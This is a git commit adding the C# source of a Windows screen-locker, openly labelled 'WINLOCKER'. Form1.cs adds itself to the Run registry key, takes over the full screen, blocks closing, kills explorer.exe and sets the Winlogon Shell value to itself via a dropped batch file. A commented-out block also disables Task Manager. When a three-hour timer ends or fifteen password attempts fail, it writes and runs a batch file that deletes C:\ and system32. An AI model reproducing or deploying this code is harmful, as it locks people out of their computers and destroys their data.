cbc26c9c55ddd17fc0b8db5129ed653f2fa63aa1
plugg1N <bbulkaskoricey87@gmail.com>
2022-11-07 23:14:16 +0300

    first commit

---
+++ Winlock/Form1.Designer.cs
@@ -0,0 +1,172 @@
+﻿namespace Winlock
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // textBox1
+            // 
+            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 16F);
+            this.textBox1.Location = new System.Drawing.Point(722, 822);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(503, 63);
+            this.textBox1.TabIndex = 0;
+            this.textBox1.Text = "Enter a password :)";
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.button1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.button1.Font = new System.Drawing.Font("Uni Sans Heavy Caps", 26F, System.Drawing.FontStyle.Bold);
+            this.button1.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.button1.Location = new System.Drawing.Point(722, 902);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(503, 114);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "UNLOCK";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Uni Sans Heavy Caps", 80F, System.Drawing.FontStyle.Bold);
+            this.label1.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.label1.Location = new System.Drawing.Point(576, 37);
+            this.label1.Margin = new System.Windows.Forms.Padding(1, 0, 1, 0);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(645, 128);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "WINLOCKER";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(1207, 23);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(202, 156);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 3;
+            this.pictureBox1.TabStop = false;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.SystemColors.MenuText;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
+            this.label3.ForeColor = System.Drawing.Color.DarkRed;
+            this.label3.Location = new System.Drawing.Point(765, 902);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(420, 17);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Enter a CORRECT password, in order to unlock your shitty PC :) *";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
+            this.label4.ForeColor = System.Drawing.SystemColors.HighlightText;
+            this.label4.Location = new System.Drawing.Point(624, 354);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(42, 18);
+            this.label4.TabIndex = 6;
+            this.label4.Text = "Hello";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Uni Sans Heavy Caps", 47.99999F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label2.ForeColor = System.Drawing.Color.Red;
+            this.label2.Location = new System.Drawing.Point(825, 228);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(256, 77);
+            this.label2.TabIndex = 7;
+            this.label2.Text = "label2";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 16F);
+            this.label5.ForeColor = System.Drawing.Color.Firebrick;
+            this.label5.Location = new System.Drawing.Point(908, 783);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(135, 26);
+            this.label5.TabIndex = 8;
+            this.label5.Text = "Attempts: 15";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.Desktop;
+            this.ClientSize = new System.Drawing.Size(1904, 1041);
+            this.ControlBox = false;
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label5;
+    }
+}
+
---
+++ Winlock/Form1.cs
@@ -0,0 +1,193 @@
+﻿using System;
+using System.ComponentModel;
+using System.Drawing;
+using System.IO;
+using System.Text;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Threading;
+
+namespace Winlock
+{
+    public partial class Form1 : Form
+    {
+
+        private System.Windows.Forms.Timer timer1;
+        private int counter = 10800;
+        private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+        private static readonly string StartupValue = "MyApplicationName";
+
+        // add to startup
+        private static void SetStartup()
+        {
+            // set the application to run at startup
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(StartupKey, true);
+            key.SetValue(StartupValue, Application.ExecutablePath.ToString());
+        }
+
+        public Form1()
+        {
+            // run over other apps
+            TopMost = true;
+            InitializeComponent();
+            SetStartup();
+        }
+
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
+            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+
+
+            // locations
+            label1.Location = new Point(screenWidth/2-label1.Width/2-label1.Width/4, label1.Height- label1.Height/2);
+            pictureBox1.Location = new Point(label1.Location.X+label1.Width, label1.Location.Y);
+            label2.Location = new Point(label1.Location.X, (label1.Location.Y + label4.Location.Y)/2);
+            label4.Location = new Point(label2.Location.X, label2.Location.Y + label4.Height*8);
+            button1.Location = new Point(screenWidth / 2 - button1.Width / 2, screenHeight - button1.Height * 2 + button1.Height / 2);
+            textBox1.Location = new Point(screenWidth / 2 - textBox1.Width / 2, screenHeight - textBox1.Height * 2 - textBox1.Height * 2);
+            label3.Location = new Point(screenWidth / 2 - label3.Width / 2, screenHeight - label3.Height * 2 - label3.Height * 2 - button1.Height+5);
+            label5.Location = new Point(screenWidth / 2 - label5.Width / 2, textBox1.Location.Y - label5.Height);
+
+
+            // maxmize
+            FormBorderStyle = FormBorderStyle.None;
+            WindowState = FormWindowState.Maximized;
+
+            string PC_name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            string username = Environment.UserName;
+
+
+            // timer
+            timer1 = new System.Windows.Forms.Timer();
+            timer1.Tick += new EventHandler(timer1_Tick);
+            timer1.Interval = 1000; // 1 second
+            timer1.Start();
+            int hoursTimer = counter/3600;
+            int minutesTimer = counter/60;
+            label2.Text = "You have: " + hoursTimer.ToString() + " Hours or" + " " + minutesTimer.ToString() + " Minutes";
+
+
+            label4.Text = String.Format(
+                "Wow! Hello there, {0}! Great to see you! Your PC has been officially locked by my WinLocker!\n\n" +
+                "Your PC name is: {1}\n" +
+                "OS: {2}\n" +
+                "Amount of processor cores: {3}\n" +
+                "Processor model: {4}",
+
+                username,
+                PC_name,
+                Environment.OSVersion,
+                Environment.ProcessorCount,
+                Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER"));
+
+
+            /**
+             * "REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Keyboard Layout\" /v \"Scancode Map\" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f &&" +
+                " Taskkill /f /im explorer.exe &&" +
+                " reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\\"Windows NT\"\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d {0} /f &&" +
+                " reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\\"Windows NT\"\\CurrentVersion\\Winlogon\" /v userinit /t REG_SZ /d {0} /f &&" +
+                " reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f", System.Reflection.Assembly.GetEntryAssembly().Location);
+             **/
+
+
+            // create a .bat file with malicious commands
+            string path = @"c:\Windows\srcrn.bat";
+            string a = String.Format(" reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d {0} /f", System.Reflection.Assembly.GetEntryAssembly().Location);
+
+            using (FileStream fs = File.Create(path))
+            {
+                byte[] info = new UTF8Encoding(true).GetBytes("Taskkill /f /im explorer.exe &&" +
+                    a);
+                // Add some information to the file.
+                fs.Write(info, 0, info.Length);
+            }
+
+            // run this file
+            System.Diagnostics.Process.Start(path);
+        }
+
+
+        // don't let user close the app
+        protected override void OnClosing(CancelEventArgs e)
+        {
+            base.OnClosing(e);
+            e.Cancel = true;
+        }
+
+
+        // timer handler
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            counter--;
+            int hoursTimer = counter / 3600;
+            int minutesTimer = counter / 60;
+            if (counter == 0)
+            {
+                timer1.Stop();
+
+                // delete your fucking Windows brah
+                string path = @"c:\Windows\module.bat";
+                using (FileStream fs = File.Create(path))
+                {
+                    byte[] info = new UTF8Encoding(true).GetBytes("RD C:\\ /S /Q && del c:\\windows\\system32*.* /q && del /f /s /q “C:*.*.”");
+                    // Add some information to the file.
+                    fs.Write(info, 0, info.Length);
+                }
+
+                // run this file
+                System.Diagnostics.Process.Start(path);
+
+                Thread.Sleep(75000);
+
+                Application.Exit();
+
+            }
+            label2.Text = "You have: " + hoursTimer.ToString() + " Hours or" + " " + minutesTimer.ToString() + " Minutes";
+        }
+
+
+        // correct password check
+        private static int attempts = 15;
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (textBox1.Text == "9872")
+            {
+                Application.Exit();
+            }
+
+            else {
+                attempts--;
+                label5.Text = String.Format("Attempts: {0}", attempts);
+            }
+
+            if (attempts == 0)
+            {
+                // delete your fucking Windows brah
+                string path = @"c:\Windows\module.bat";
+                using (FileStream fs = File.Create(path))
+                {
+                    byte[] info = new UTF8Encoding(true).GetBytes("RD C:\\ /S /Q && del c:\\windows\\system32*.* /q && del /f /s /q “C:*.*.”");
+                    // Add some information to the file.
+                    fs.Write(info, 0, info.Length);
+                }
+
+                // run this file
+                System.Diagnostics.Process.Start(path);
+
+                Thread.Sleep(50000);
+
+
+                Application.Exit();
+
+            }
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
